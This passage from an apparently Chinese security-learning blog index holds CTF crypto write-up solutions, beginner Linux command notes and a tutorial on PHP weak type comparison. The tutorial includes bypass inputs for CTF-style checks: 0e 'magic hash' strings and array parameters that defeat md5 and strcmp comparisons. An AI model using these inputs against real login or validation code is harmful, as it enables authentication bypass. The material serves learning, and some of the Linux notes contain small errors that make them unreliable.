punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> chars<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            sbu<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sbu<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ZmxhZ3tjcnlwdG9faXNfaHhiX3NvX2VBc3kwfQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64解密后得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;crypto_is_hxb_so_eAsy0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h3><p>题目：</p><p>小明家菜园要建栅栏，请教了他心爱的女神，女神给了这么点提示，他却看不懂，你能帮助他吗？</p><p>f_tnluz_aghggeao{t_oy_ldoia}</p><br><p>栅栏密码</p><p><img src="https://s3.ax1x.com/2020/11/19/Du65JH.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;yo_uget_itzha_lan_good&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h3><p>我军成功捣毁敌军秘密电台缴获密文和明文一份，但是还有一份密文难以破解特请你来破译密码：</p><p>待解密文：givfome</p><br><p>用<a href="https://blog.csdn.net/m0_46132784/article/details/109597249">脚本</a>进行词频分析</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sysalphabet <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]"</span>data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token punctuation">&#123;</span>d<span class="token punctuation">:</span><span class="token number">0</span> <span class="token keyword">for</span> d <span class="token keyword">in</span> alphabet<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">sort_by_value</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span>    items <span class="token operator">=</span> d<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span>    backitems <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> v <span class="token keyword">in</span> items<span class="token punctuation">]</span>    backitems<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>backitems<span class="token punctuation">,</span><span class="token string">'\n\n'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span> backitems<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>backitems<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> d <span class="token keyword">in</span> data<span class="token punctuation">:</span>    <span class="token keyword">for</span> alpha <span class="token keyword">in</span> alphabet<span class="token punctuation">:</span>        <span class="token keyword">if</span> d <span class="token operator">==</span> alpha<span class="token punctuation">:</span>            result<span class="token punctuation">[</span>alpha<span class="token punctuation">]</span> <span class="token operator">=</span> result<span class="token punctuation">[</span>alpha<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>sort_by_value<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2020/11/19/Du2Lex.png"></p><p>密文：</p><pre class="line-numbers language-none"><code class="language-none">givfometjlysnhuczkwbrqdxpa&#125;&#123;_^][ZYXWVUTSRQPONMLKJIHGFEDCBA@&#x3D;9876543210-+*)(&amp;%$#!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>明文：</p><pre class="line-numbers language-none"><code class="language-none">eantosirlhugdpcmf0wybvkA)(S21xTPC86-zjWLE4qUNMIGB53&#125;&#123;_^]ZYXVRQOKJHFD@&#x3D;97+*&amp;%$#!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解密密文：givfome，得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;eantosi&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记——Linux</title>
      <link href="posts/20201112.html"/>
      <url>posts/20201112.html</url>
      
        <content type="html"><![CDATA[<p>Linux学习笔记</p><span id="more"></span><p>Linux是开源的操作系统，系统特点有：开放性（开源）、多用户、多任务、良好的用户界面、优异的性能与稳定性等等。</p><p>学习笔记目录：</p><ul><li>文件目录结构</li><li>终端</li><li>路径</li><li>指令</li></ul><br><h2 id="文件目录结构"><a href="#文件目录结构" class="headerlink" title="文件目录结构"></a>文件目录结构</h2><p><img src="https://s3.ax1x.com/2020/11/12/Bz52Ks.png"></p><p>bin：全称binary，含义是二进制。该目录中存储的都是一些二进制文件，文件都是可以被运行的。</p><p>dev：该目录中主要存放的是外接设备，例如盘、其他的光盘等。在其中的外接设备是不能直接被使用的，需要<strong>挂载</strong>（类似windows下的分配盘符）。</p><p>etc：该目录主要存储一些配置文件。</p><p>home：表示“家”，表示<strong>除了root用户以外其他用户的家目录</strong>，类似于windows下的User/用户目录。</p><p>mnt：当外接设备需要挂载的时候，就需要挂载到mnt目录下。</p><p>proc：process，表示进程，该目录中存储的是Linux运行时候的进程。</p><p>root：该目录是root用户自己的家目录。</p><p>sbin：全称super binary，该目录也是存储一些可以被执行的二进制文件，但是必须得有super权限的用户才能执行。</p><p>tmp：表示“临时”的，当系统运行时候产生的临时文件会在这个目录存着。</p><p>usr：存放的是用户自己安装的软件。类似于windows下的program files。</p><p>var：存放的程序/系统的日志文件的目录。</p><br><h2 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h2><p><img src="https://s3.ax1x.com/2020/11/12/Bz4Sw6.png"></p><p><code>kali</code>：当前终端登录的用户名</p><p><code>@</code>：发音at，表示”在“</p><p><code>kali</code>：当前登录的主机名</p><p><code>~/桌面</code>：当前终端的工作目录</p><p><code>$</code>：身份识别符，如果是超级管理员登录则显示<code>#</code>，否则显示<code>$</code>符号</p><br><ul><li>超级管理员终端界面如下：</li></ul><p><img src="https://s3.ax1x.com/2020/11/12/BzItiT.png"></p><br><h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><p>路径可以分为两种：相对路径和绝对路径</p><ul><li>相对路径：</li></ul><p><code>./</code>：表示当前目录下；<code>../</code>：表示当前目录下</p><ul><li>绝对路径：</li></ul><p><code>/</code>：从根目录下寻找对应路径</p><blockquote><p>在Linux中有一个特殊的符号“~”，表示当前用户的家目录。</p></blockquote><br><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>Linux指令通用格式</p><p>#指令主体（空格） [选项]（空格） [操作对象]</p><p>一个指令可以包含多个选项</p><p>操作对象也可以是多个</p><br><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p><strong>(list)</strong></p><ul><li>ls</li></ul><p>列出当前工作目录下的所有文件/文件夹的名称</p><ul><li>ls 路径</li></ul><p>列出指定路径下的所有文件/文件夹的名称</p><ul><li><p>ls 选项 路径</p><ul><li><p>ls -l 路径</p><p>-l：表示list，表示以详细列表的形式进行展示</p></li><li><p>ls -a 路径</p><p>-a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹）</p></li><li><p>ls -lh 路径</p><p>-lh：-a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹）</p></li></ul></li></ul><br><h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p><strong>(print working directory)</strong></p><ul><li>pwd</li></ul><p>打印当前工作目录</p><br><h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><p><strong>(change directory)</strong></p><ul><li>cd 路径</li></ul><p>切换到路径所在目录</p><br><h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><p><strong>(make directory)</strong></p><ul><li>mkdir 路径</li></ul><p>创建目录，可以是文件夹名称也可以是包含名称的一个完整路径</p><ul><li>mkdir -p 路径</li></ul><p>当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错</p><ul><li>mkdir 路径1 路径2 路径3 …</li></ul><p>表示一次性创建多个目录</p><br><h3 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h3><p><strong>创建文件</strong></p><ul><li>touch 文件路径</li></ul><p>文件路径可以是直接的文件名也可以是路径，touch也可以同时创建多个文件</p><br><h3 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h3><ul><li>clear</li></ul><p>清屏</p><br><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><p><strong>(copy)</strong></p><ul><li>cp 被复制的文档路径 文档被复制到的路径</li></ul><p>复制文档到新路径下的位置，在复制过程中是可以对新位置的文件重命名的</p><ul><li>cp -r 被复制的文件夹路径 文件夹被复制到的路径</li></ul><p><code>-r</code>表示递归复制</p><br><h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><p><strong>(move)</strong></p><ul><li>mv 需要移动的文档路径 需要保存的位置路径</li></ul><p>移动文档到新位置，原始文件在移动后不在原始位置</p><ul><li>mv 需要移动的文件夹路径 需要保存的位置路径</li></ul><p>移动一个文件夹，同移动文档</p><br><p>注：</p><p><strong>在Linux中重命名的命令也是mv，语法和移动语法一样</strong></p><p>如：重命名根目录下的<code>a.txt</code>为<code>b.txt</code></p><p>mv /a.txt /b.txt</p><br><h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><p><strong>(remove)</strong></p><ul><li><p>rm 选项 需要移除的文档路径</p><ul><li><p>rm -f 需要移除的文档路径</p><p>force：表示强制删除，不提示是否删除</p></li><li><p>rm -r 需要移除的文件夹路径</p><p>-r：表示递归，删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用-rf选项</p></li><li><p>rm -rf 文档路径/文件夹路径/…</p><p>删除多个文档和文件夹</p></li></ul></li></ul><br><p>注：</p><p>要删除一个目录下有公共特性的文档，例如以test开头的文档，可以使用通配符<code>*</code></p><p>rm -f test*</p><p>表示强制删除只要文件是以test开头的，后续字符不管的文档</p><br><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。</p><p><code>&gt;</code>：<strong>覆盖</strong>输出，会覆盖掉原先的文件内容</p><p><code>&gt;&gt;</code>：<strong>追加</strong>输出，不会覆盖原始文件内容，会在原始内容末尾继续添加</p><ul><li>正常执行的指令 &gt;/&gt;&gt; 文件的路径</li></ul><p>注：文件可以不存在，不存在则新建</p><p>如：使用覆盖重定向，保存 ls -lah 的执行结果到当前目录下的 ls.txt</p><p>ls -lah &gt; ls.txt</p><br><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><ul><li>cat 文档路径</li></ul><p>直接打开一个文档，结果输出在终端</p><ul><li>cat 文档路径1 文档路径2 … 文档路径n &gt; 文档路径x</li></ul><p>配合输出重定向，将文档路径1到文档路径n的内容合并到文档路径x</p><br><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道符：<code>|</code></p><p>管道一般可以用于“过滤”，“特殊”，“扩展处理”。</p><ul><li>指令A | 指令B</li></ul><p>指令A的正确输出作为指令B的操作对象</p><p><img src="https://s3.ax1x.com/2020/11/12/BzxVwF.png"></p><blockquote><p>grep指令：主要用于过滤</p></blockquote><br><h3 id="du-sh"><a href="#du-sh" class="headerlink" title="du -sh"></a>du -sh</h3><ul><li>du -sh 目录路径</li></ul><p>查看目录的真实大小</p><p>-s：summaries，只显示汇总的大小</p><p>-h：表示以高可读性的形式进行显示</p><p>如：统计”/etc“目录实际大小</p><p>du -sh /etc/</p><br><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p><img src="https://s3.ax1x.com/2020/11/12/Bzzenf.png"></p><p><code>%F</code>：等价于<code>%Y-%m-%d</code></p><p><code>%T</code>：等价于<code>%H:%M:%S</code></p><pre class="line-numbers language-none"><code class="language-none">%F：表示完整的年月日%T：表示完整的时分秒%Y：表示四位年份%m：表示两位月份（带前导0）%d：表示日期（带前导0）%H：表示小时（带前导0）%M：表示分钟（带前导0）%S：表示秒数（带前导0）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 弱类型比较问题</title>
      <link href="posts/20201029.html"/>
      <url>posts/20201029.html</url>
      
        <content type="html"><![CDATA[<p>PHP是一门弱类型语言，存在弱类型比较问题</p><span id="more"></span><h2 id="PHP-弱类型比较问题"><a href="#PHP-弱类型比较问题" class="headerlink" title="PHP 弱类型比较问题"></a>PHP 弱类型比较问题</h2><ul><li><p>字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。</p></li><li><p>bool true和任何比较都相等，除了0和false，因为0认为是bool false。</p></li><li><p>md5或者sha不能加密数组，所以在加密数组的时候会返回false。</p></li><li><p>“0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。</p></li><li><p>只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即<code>0e\d+</code>的字符串 == ‘0’ 为true。</p></li><li><p>PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。</p></li></ul><table><thead><tr><th>字符串</th><th>md5()</th></tr></thead><tbody><tr><td>240610708</td><td>0e462097431906509019562988736854</td></tr><tr><td>QNKCDZO</td><td>0e830400451993494058024219903391</td></tr><tr><td>s878926199a</td><td>0e545993274517709034328855841020</td></tr><tr><td>s155964671a</td><td>0e342768416822451524974117254469</td></tr><tr><td>s214587387a</td><td>0e848240448830537924465865611904</td></tr></tbody></table><p>参考：</p><p><a href="https://www.php.net/manual/zh/language.operators.comparison.php">PHP官方手册——比较运算符</a></p><p><a href="https://blog.csdn.net/u014029795/article/details/99709333?biz_id=102&utm_term=php%20%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-99709333&spm=1018.2118.3001.4187">PHP 弱类型比较总结</a></p><br><h3 id="“-”与“-”"><a href="#“-”与“-”" class="headerlink" title="“==”与“===”"></a>“==”与“===”</h3><p><code>==</code>  数据类型不一样的时候会将数据类型转换为相同的再进行比较</p><p><code>===</code>   除了对数据的值进行比较还会对数据的类型进行比较</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'o'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no hack!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token operator">==</span><span class="token number">520</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"U are right!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入520，则：no hack!!</p><p>输入520a，则：U are right!</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'520a'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a520'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>520</p><p>a</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>bool(true)<br>bool(false)</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'0e12'</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'0e34'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'0e12'</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'0e34'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>bool(true)<br>bool(false)</p></blockquote><br><h3 id="switch弱类型比较问题"><a href="#switch弱类型比较问题" class="headerlink" title="switch弱类型比较问题"></a>switch弱类型比较问题</h3><p>switch中同样存在弱类型比较问题，原理和上面类似</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$i</span> <span class="token operator">=</span><span class="token string double-quoted-string">"3a"</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"this is two"</span><span class="token punctuation">;</span>         <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终输出 flag</p><br><h3 id="字符串和数字比较"><a href="#字符串和数字比较" class="headerlink" title="字符串和数字比较"></a>字符串和数字比较</h3><p><strong>字符串和数字比较时，会先把字符串转换为数字，不能转换为数字的字符串或null，被转换为0。</strong></p><p>如：”a”或”a1”是不能转换为数字的字符串，而”1”或”1a”是可以转换为数字的字符串</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1a'</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a1'</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'12a'</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>bool(true)<br>bool(false)<br>bool(true)<br>bool(true)<br>bool(false)<br>bool(false)</p></blockquote><br><h3 id="布尔值true和任意比较"><a href="#布尔值true和任意比较" class="headerlink" title="布尔值true和任意比较"></a>布尔值true和任意比较</h3><p><strong>bool true和任何比较都相等，除了0和false，因为0认为是bool false。</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'False'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>bool(false)<br>bool(true)<br>bool(true)<br>bool(true)</p></blockquote><br><h3 id="md5-、sha1-哈希函数相等问题"><a href="#md5-、sha1-哈希函数相等问题" class="headerlink" title="md5()、sha1()哈希函数相等问题"></a>md5()、sha1()哈希函数相等问题</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Wrong'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要得到flag，得想办法让a和b的值不相等，但md5加密后的<strong>值</strong>相等。</p><p>由于<strong>md5或者sha不能加密数组，所以在加密数组的时候会返回false。</strong></p><p>利用这点，给a和b分别传参两个不同的数组，就可以得到flag。</p><pre class="line-numbers language-none"><code class="language-none">?a[]&#x3D;1&amp;b[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="十六进制比较问题"><a href="#十六进制比较问题" class="headerlink" title="十六进制比较问题"></a>十六进制比较问题</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$one</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nine</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>          <span class="token variable">$digit</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">&#123;</span><span class="token variable">$i</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$digit</span> <span class="token operator">>=</span> <span class="token variable">$one</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$digit</span> <span class="token operator">&lt;=</span> <span class="token variable">$nine</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$number</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'54975581388'</span><span 